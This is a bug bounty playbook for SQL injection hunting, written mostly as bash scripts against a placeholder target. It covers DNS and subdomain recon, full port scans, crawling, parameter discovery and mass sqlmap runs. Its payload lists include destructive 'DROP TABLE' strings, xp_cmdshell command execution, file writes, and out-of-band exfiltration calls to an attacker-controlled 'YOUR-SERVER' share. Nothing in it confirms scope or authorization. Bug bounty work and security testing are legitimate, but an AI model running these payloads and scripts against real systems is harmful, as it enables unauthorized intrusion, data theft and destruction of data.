# COMPLETE BUG BOUNTY SQL INJECTION HUNTING FRAMEWORK

### 📁 Setup Working Directory Structure
```bash
TARGET="target.com"
mkdir -p ~/bugbounty/$TARGET/{recon,scans,crawls,params,sqli,vulns,headers}
cd ~/bugbounty/$TARGET
```

---

## 🔍 PHASE 1: INITIAL RECONNAISSANCE & FINGERPRINTING

### 1.1 Basic IP Resolution
```bash
# Get all IPs
dig +short $TARGET > recon/ips.txt
dig +short www.$TARGET >> recon/ips.txt
host $TARGET | grep "has address" | cut -d " " -f4 > recon/all_ips.txt
nslookup $TARGET | grep "Address" | tail -n1 | cut -d " " -f2 >> recon/all_ips.txt
```

### 1.2 Reverse IP Lookup
```bash
# Reverse DNS
for ip in $(cat recon/all_ips.txt); do
    dig +short -x $ip >> recon/reverse_dns.txt
done
curl -s "https://api.hackertarget.com/reverseiplookup/?q=$TARGET" > recon/reverse_ip_api.txt
```

### 1.3 Complete DNS Enumeration
```bash
# All DNS records
dig ANY $TARGET @8.8.8.8 > recon/dns_all_records.txt
dig A $TARGET +short > recon/dns_a.txt
dig AAAA $TARGET +short > recon/dns_aaaa.txt
dig MX $TARGET +short > recon/dns_mx.txt
dig NS $TARGET +short > recon/dns_ns.txt
dig TXT $TARGET +short > recon/dns_txt.txt
dig CNAME $TARGET +short > recon/dns_cname.txt
dig SOA $TARGET +short > recon/dns_soa.txt

# Zone transfer attempt
for ns in $(dig NS $TARGET +short); do
    dig AXFR $TARGET @$ns >> recon/zone_transfer.txt
done

# Subdomain enumeration
subfinder -d $TARGET -o recon/subdomains_subfinder.txt
assetfinder --subs-only $TARGET > recon/subdomains_assetfinder.txt
findomain -t $TARGET -q > recon/subdomains_findomain.txt
chaos -d $TARGET -o recon/subdomains_chaos.txt

# Merge & unique
cat recon/subdomains_*.txt | sort -u > recon/all_subdomains.txt
```

---

## 🚪 PHASE 2: PORT SCANNING & SERVICE DISCOVERY

### 2.1 Naabu Fast Port Scan
```bash
# Fast scan common ports
naabu -host $TARGET -p - -rate 1000 -o scans/naabu_all_ports.txt

# Full port scan
naabu -host $TARGET -p 1-65535 -rate 3000 -o scans/naabu_full_ports.txt

# Scan with service detection
naabu -host $TARGET -p 1-65535 -rate 2000 -sV -o scans/naabu_services.txt
```

### 2.2 Nmap Deep Scanning
```bash
# Quick scan top 1000 ports
nmap -sS -T4 -Pn --top-ports 1000 $TARGET -oN scans/nmap_quick.txt

# Full port scan with version detection
nmap -sS -sV -sC -T4 -Pn -p- $TARGET -oN scans/nmap_full.txt

# UDP scan top ports
nmap -sU -T4 -Pn --top-ports 100 $TARGET -oN scans/nmap_udp.txt

# OS detection
nmap -O -T4 -Pn $TARGET -oN scans/nmap_os.txt

# Specific port groups for SQL databases
nmap -sS -sV -T4 -Pn -p 3306,1433,5432,1521,27017,6379,9200 \
     $TARGET -oN scans/nmap_db_ports.txt \
     --script=mysql-info,ms-sql-info,oracle-tns-version,mongodb-info,redis-info

# Web ports deep scan
nmap -sS -sV -T4 -Pn -p 80,443,81,300,591,593,832,981,1010,1311,3000,4243,7474,9000,9200,11371,3128,8118,8123,8222,7000,8042,8888 \
     $TARGET -oN scans/nmap_web_ports.txt \
     --script=http-enum,http-headers,http-methods,http-title,http-server-header
```

### 2.3 Port Analysis
```bash
# Extract open ports
grep "open" scans/*.txt | awk '{print $1,$3,$4}' | sort -u > scans/open_ports_summary.txt

# Extract closed/filtered ports
grep -E "closed|filtered" scans/nmap_full.txt > scans/closed_filtered_ports.txt

# Database services only
grep -E "mysql|mssql|postgresql|oracle|mongodb|redis|elasticsearch" scans/nmap_full.txt > scans/db_services.txt
```

---

## 🕷️ PHASE 3: ADVANCED CRAWLING & ENDPOINT DISCOVERY

### 3.1 Katana Crawling (All HTTP Methods)
```bash
# Basic crawl
katana -u https://$TARGET -o crawls/katana_basic.txt

# Deep crawl with all methods
katana -u https://$TARGET \
       -d 10 \
       -jc \
       -kf all \
       -m GET,POST,PUT,DELETE,PATCH \
       -o crawls/katana_deep.txt

# Crawl with form extraction
katana -u https://$TARGET \
       -d 5 \
       -jc \
       -kf all \
       -fx \
       -m GET,POST \
       -o crawls/katana_forms.txt

# Crawl with headers
katana -u https://$TARGET \
       -d 5 \
       -jc \
       -kf all \
       -hl \
       -o crawls/katana_headers.txt

# JS file discovery
katana -u https://$TARGET \
       -d 5 \
       -jc \
       -em js,jsp,json \
       -o crawls/katana_js_files.txt
```

### 3.2 Gospider Advanced Crawling
```bash
# Deep crawl with third-party sources
gospider -s https://$TARGET \
         -d 5 \
         -c 10 \
         -t 20 \
         --other-source \
         --include-other-source \
         -o crawls/gospider_output/

# Extract all unique URLs
cat crawls/gospider_output/* | grep -E "\[url\]" | awk '{print $2}' | sort -u > crawls/gospider_urls.txt

# Extract JavaScript files
cat crawls/gospider_output/* | grep -E "\[javascript\]" | awk '{print $2}' | sort -u > crawls/gospider_js.txt

# Extract forms
cat crawls/gospider_output/* | grep -E "\[form\]" | awk '{print $2}' | sort -u > crawls/gospider_forms.txt
```

---

## 📡 PHASE 4: HEADER & BANNER GRABBING

### 4.1 Curl Complete Header Analysis
```bash
# Full header grab with all details
curl -sI -L https://$TARGET \
     -H "User-Agent: Mozilla/5.0" \
     -H "Accept: */*" \
     -v > headers/curl_full_headers.txt 2>&1

# Check all important ports for headers
for port in 80 443 81 300 591 593 832 981 1010 1311 3000 4243 7474 9000 9200 11371 3128 8118 8123 8222 7000 8042 8888; do
    echo "=== Port $port ===" >> headers/port_headers.txt
    curl -sI -L http://$TARGET:$port --max-time 5 >> headers/port_headers.txt 2>&1
    curl -sI -L https://$TARGET:$port --max-time 5 >> headers/port_headers.txt 2>&1
done
```

### 4.2 SSL/TLS Security Check
```bash
# SSL certificate details
openssl s_client -connect $TARGET:443 -servername $TARGET \
                 </dev/null 2>/dev/null | openssl x509 -text > headers/ssl_cert.txt

# SSL vulnerabilities check
testssl.sh https://$TARGET > headers/ssl_test.txt

# Check SSL/TLS versions
sslscan $TARGET:443 > headers/ssl_scan.txt
```

### 4.3 Specific Header Extraction for SQL Injection
```bash
# Extract only important headers
curl -sI -L https://$TARGET | grep -iE "server|x-powered-by|set-cookie|content-type|content-length|www-authenticate|x-frame-options|x-content-type-options|x-xss-protection|strict-transport-security|content-security-policy" > headers/important_headers.txt

# Full response with body (check for error messages)
curl -s -L https://$TARGET -D headers/response_headers.txt > headers/response_body.html
```

---

## 📂 PHASE 5: DIRECTORY & FILE STRUCTURE

### 5.1 Directory Bruteforce
```bash
# FFUF directory fuzzing
ffuf -u https://$TARGET/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -mc 200,201,202,203,204,301,302,307,308,401,403,405,500 \
     -t 100 \
     -o dirs/ffuf_results.json

# Dirsearch
dirsearch -u https://$TARGET \
          -e php,asp,aspx,jsp,html,js,txt,bak,zip,sql,db \
          -t 50 \
          --format=plain \
          -o dirs/dirsearch_results.txt

# Gobuster
gobuster dir -u https://$TARGET \
             -w /usr/share/wordlists/dirb/common.txt \
             -x php,txt,html,js,asp,aspx \
             -t 50 \
             -o dirs/gobuster_results.txt
```

### 5.2 Sensitive File Discovery
```bash
# Common sensitive files
for file in robots.txt sitemap.xml sitemap.xml.gz crossdomain.xml clientaccesspolicy.xml .htaccess .env .git/config .svn/entries web.config; do
    curl -s -L https://$TARGET/$file -o dirs/${file}.txt 2>&1
done
```

---

## 🗺️ PHASE 6: SITEMAP & API DISCOVERY

### 6.1 Sitemap Extraction
```bash
# Download and parse sitemaps
curl -s https://$TARGET/sitemap.xml | grep -oP 'https?://[^<]+' | sort -u > sitemaps/sitemap_urls.txt
curl -s https://$TARGET/sitemap.xml.gz | gunzip | grep -oP 'https?://[^<]+' | sort -u >> sitemaps/sitemap_urls.txt

# Additional sitemap locations
for sitemap in sitemap.xml sitemap_index.xml sitemap1.xml sitemap-index.xml sitemap.php sitemap.txt; do
    curl -s https://$TARGET/$sitemap -o sitemaps/$sitemap 2>&1
done
```

### 6.2 API Endpoint Discovery
```bash
# Common API paths
echo -e "/api\n/api/v1\n/api/v2\n/v1\n/v2\n/graphql\n/swagger\n/api-docs\n/openapi.json\n/swagger.json" > params/api_wordlist.txt

ffuf -u https://$TARGET/FUZZ \
     -w params/api_wordlist.txt \
     -mc 200,301,302,401,403 \
     -t 50 \
     -o params/api_endpoints.json
```

---

## 🔍 PHASE 7: PARAMETER DISCOVERY

### 7.1 LinkFinder - Extract Endpoints from JS
```bash
# Run linkfinder on all JS files
mkdir -p params/linkfinder_output

for js in $(cat crawls/katana_js_files.txt crawls/gospider_js.txt 2>/dev/null | sort -u); do
    python3 /opt/LinkFinder/linkfinder.py -i $js -o cli >> params/linkfinder_endpoints.txt
done

# Clean and sort endpoints
cat params/linkfinder_endpoints.txt | sort -u | grep -E "https?://" > params/all_js_endpoints.txt
```

### 7.2 Parameter Discovery with Arjun
```bash
# Parameter discovery
arjun -u https://$TARGET -t 20 -oT params/arjun_target.txt
arjun -u https://$TARGET/api/ -t 20 -oT params/arjun_api.txt

# Scan discovered URLs
cat crawls/katana_deep.txt | while read url; do
    arjun -u $url -t 10 -oT params/arjun_parameters.txt
done
```

### 7.3 Extract Parameters from URLs
```bash
# Extract all GET parameters
cat crawls/katana_deep.txt crawls/gospider_urls.txt | \
    grep -oP '(?<=\?)[^&\s]+' | \
    sort -u > params/get_parameters.txt

# Extract endpoints with parameters
grep -E "\?.*=" crawls/katana_deep.txt crawls/gospider_urls.txt > params/urls_with_params.txt
```

---

## 💉 PHASE 8: SQL INJECTION TESTING

### 8.1 Manual SQL Injection Header Testing
```bash
# SQL injection payloads for headers
payloads=(
    "'"
    "\""
    "1' OR '1'='1"
    "1\" OR \"1\"=\"1"
    "' OR 1=1--"
    "\" OR 1=1--"
    "' OR 1=1#"
    "\" OR 1=1#"
    "' OR 'x'='x"
    "1; DROP TABLE users--"
    "' UNION SELECT NULL--"
    "admin'--"
    "' WAITFOR DELAY '00:00:05'--"
    "1' AND 1=1--"
    "1' AND 1=2--"
)

# Test headers with SQLi payloads
for payload in "${payloads[@]}"; do
    echo "=== Testing: $payload ===" >> sqli/header_sqli.txt
    curl -s -L https://$TARGET \
         -H "User-Agent: $payload" \
         -H "X-Forwarded-For: $payload" \
         -H "Cookie: session=$payload" \
         -H "Referer: $payload" \
         -w "\nResponse Time: %{time_total}\n" \
         -o /dev/null >> sqli/header_sqli.txt 2>&1
done
```

### 8.2 SQLMap Automated Testing
```bash
# Basic SQLMap scan
sqlmap -u "https://$TARGET" \
       --batch \
       --random-agent \
       --level=3 \
       --risk=2 \
       --dbs \
       --output-dir=sqli/sqlmap_scan

# Scan with parameters
sqlmap -u "https://$TARGET/page.php?id=1" \
       --batch \
       --level=5 \
       --risk=3 \
       --dbs \
       --tamper=between,space2comment \
       --output-dir=sqli/sqlmap_params

# POST request testing
sqlmap -u "https://$TARGET/login" \
       --data="username=admin&password=admin" \
       --batch \
       --level=3 \
       --risk=2 \
       --dbs \
       --output-dir=sqli/sqlmap_post

# Scan from file (all discovered URLs)
cat params/urls_with_params.txt | while read url; do
    sqlmap -u "$url" \
           --batch \
           --level=2 \
           --risk=1 \
           --dbs \
           --output-dir=sqli/sqlmap_urls/ \
           --skip-waf
done
```

### 8.3 Database-Specific Payloads

#### MySQL Injection Payloads
```bash
# MySQL error-based
mysql_payloads=(
    "' OR 1=1--"
    "' AND 1=1--"
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "' UNION SELECT NULL,NULL,NULL--"
    "' UNION SELECT @@version--"
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    "' OR 1 GROUP BY CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
)

# Test MySQL payloads
for payload in "${mysql_payloads[@]}"; do
    curl -s "https://$TARGET/page.php?id=$payload" \
         -o sqli/mysql_${payload:0:20}.txt \
         -w "\nTime: %{time_total}s\n" >> sqli/mysql_results.txt
done
```

#### PostgreSQL Injection Payloads
```bash
# PostgreSQL payloads
pgsql_payloads=(
    "';SELECT PG_SLEEP(5)--"
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "';COPY (SELECT '') TO '/tmp/test'--"
)

for payload in "${pgsql_payloads[@]}"; do
    curl -s "https://$TARGET/page.php?id=$payload" \
         -o sqli/pgsql_${payload:0:20}.txt \
         -w "\nTime: %{time_total}s\n" >> sqli/pgsql_results.txt
done
```

#### MSSQL Injection Payloads
```bash
# MSSQL payloads
mssql_payloads=(
    "';WAITFOR DELAY '0:0:5'--"
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "';EXEC xp_cmdshell 'ping 127.0.0.1'--"
)

for payload in "${mssql_payloads[@]}"; do
    curl -s "https://$TARGET/page.php?id=$payload" \
         -o sqli/mssql_${payload:0:20}.txt \
         -w "\nTime: %{time_total}s\n" >> sqli/mssql_results.txt
done
```

#### Oracle Injection Payloads
```bash
# Oracle payloads
oracle_payloads=(
    "' UNION SELECT NULL FROM DUAL--"
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--"
    "' UNION SELECT NULL,NULL FROM DUAL--"
)

for payload in "${oracle_payloads[@]}"; do
    curl -s "https://$TARGET/page.php?id=$payload" \
         -o sqli/oracle_${payload:0:20}.txt \
         -w "\nTime: %{time_total}s\n" >> sqli/oracle_results.txt
done
```

### 8.4 Blind SQL Injection Time-Based Testing
```bash
# Time-based blind SQLi detection
time_based_payloads=(
    "1' AND SLEEP(5)--"
    "1' AND PG_SLEEP(5)--"
    "1'; WAITFOR DELAY '0:0:5'--"
    "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--"
    "1' AND 1=1 AND SLEEP(5)"
    "1' AND 1=2 AND SLEEP(5)"
)

for payload in "${time_based_payloads[@]}"; do
    start_time=$(date +%s%N)
    curl -s "https://$TARGET/page.php?id=$payload" > /dev/null
    end_time=$(date +%s%N)
    duration=$((($end_time - $start_time)/1000000))
    
    if [ $duration -gt 4000 ]; then
        echo "POTENTIAL TIME-BASED SQLi: $payload (${duration}ms)" >> sqli/time_based_findings.txt
    fi
done
```

### 8.5 SQL Injection in Different Positions
```bash
# Test in cookies
curl -s -L https://$TARGET \
     -H "Cookie: session=1' OR '1'='1" \
     -o sqli/cookie_test.txt

# Test in User-Agent
curl -s -L https://$TARGET \
     -A "Mozilla/5.0' OR '1'='1" \
     -o sqli/ua_test.txt

# Test in Referer
curl -s -L https://$TARGET \
     -H "Referer: https://google.com' OR '1'='1" \
     -o sqli/referer_test.txt

# Test in POST data
curl -s -L -X POST https://$TARGET/login \
     -d "username=admin' OR '1'='1&password=test" \
     -o sqli/post_test.txt
```

---

## 🔬 PHASE 9: ADVANCED SQL INJECTION TECHNIQUES

### 9.1 Second-Order SQL Injection
```bash
# Register with payload in username/email
curl -s -L -X POST https://$TARGET/register \
     -d "username=test' OR '1'='1&email=test' OR '1'='1@test.com&password=test" \
     -o sqli/second_order_register.txt

# Then trigger the stored data
curl -s -L https://$TARGET/profile \
     -o sqli/second_order_trigger.txt
```

### 9.2 Out-of-Band SQL Injection
```bash
# OOB payloads for different DBs
# MySQL OOB
curl -s "https://$TARGET/page.php?id=1' AND LOAD_FILE('\\\\\\\\YOUR-SERVER\\\\test')--"

# MSSQL OOB
curl -s "https://$TARGET/page.php?id=1';EXEC master..xp_dirtree '\\\\YOUR-SERVER\\test'--"
```

---

## 📊 PHASE 10: REPORT GENERATION

```bash
# Generate summary report
cat > bug_bounty_summary.txt << EOF
===========================================
BUG BOUNTY RECON SUMMARY - $TARGET
Date: $(date)
===========================================

1. DOMAIN INFORMATION
   - Main IPs: $(cat recon/all_ips.txt | wc -l) found
   - Subdomains: $(cat recon/all_subdomains.txt | wc -l) discovered

2. PORT SCANNING
   - Open Ports: $(grep -c "open" scans/nmap_full.txt)
   - Database Services: $(cat scans/db_services.txt | wc -l) found

3. CRAWLING RESULTS
   - Katana URLs: $(cat crawls/katana_deep.txt | wc -l)
   - Gospider URLs: $(cat crawls/gospider_urls.txt | wc -l)
   - JS Files: $(cat crawls/katana_js_files.txt crawls/gospider_js.txt | sort -u | wc -l)

4. PARAMETERS FOUND
   - GET Parameters: $(cat params/get_parameters.txt | wc -l)
   - URLs with params: $(cat params/urls_with_params.txt | wc -l)

5. SQL INJECTION FINDINGS
   - Check sqli/ directory for potential findings
EOF

cat bug_bounty_summary.txt
```

---

## 🚀 QUICK EXECUTION SCRIPT

Create a master script to run everything:

```bash
#!/bin/bash
# quick_sqli_hunt.sh - 8 Hour Challenge Script

TARGET=$1
THREADS=50

echo "[*] Starting 8-Hour SQL Injection Hunt on $TARGET"

# Phase 1: Recon (30 mins)
echo "[Phase 1] Reconnaissance..."
bash -c "
dig ANY $TARGET > recon/dns.txt
subfinder -d $TARGET -o recon/subs.txt
assetfinder --subs-only $TARGET >> recon/subs.txt
naabu -host $TARGET -p 1-65535 -rate 5000 -o scans/ports.txt
" &

# Phase 2: Crawling (2 hours)
echo "[Phase 2] Crawling..."
katana -u https://$TARGET -d 10 -jc -o crawls/endpoints.txt &
gospider -s https://$TARGET -d 5 -c 20 -o crawls/gospider/ &

wait

# Phase 3: Parameter Discovery (1 hour)
echo "[Phase 3] Finding parameters..."
cat crawls/endpoints.txt | grep "?" > params/urls_with_params.txt
for url in $(cat params/urls_with_params.txt); do
    arjun -u "$url" -t $THREADS -oT params/found_params.txt &
done

# Phase 4: SQL Injection Testing (4 hours)
echo "[Phase 4] Testing SQL Injection..."
cat params/urls_with_params.txt | while read url; do
    sqlmap -u "$url" --batch --level=3 --risk=2 --dbs -o sqli/ &
done

# Phase 5: Manual Testing (30 mins)
echo "[Phase 5] Manual verification..."
grep -r "SQL" sqli/ > sqli/findings.txt

echo "[*] Hunt complete! Check sqli/findings.txt for results"
```

---

## 🎯 PRIORITY CHECKLIST FOR 8-HOUR CHALLENGE

1. **Hour 1**: DNS recon + Port scanning
2. **Hour 2-3**: Crawling all endpoints  
3. **Hour 4**: Parameter discovery
4. **Hour 5-7**: Automated SQLi testing
5. **Hour 8**: Manual verification + Report

## ⚠️ CRITICAL SQL INJECTION INDICATORS TO WATCH:
- Response time > 5 seconds (time-based)
- SQL errors in responses
- Different response lengths
- Boolean-based differences
- Stack trace with DB info
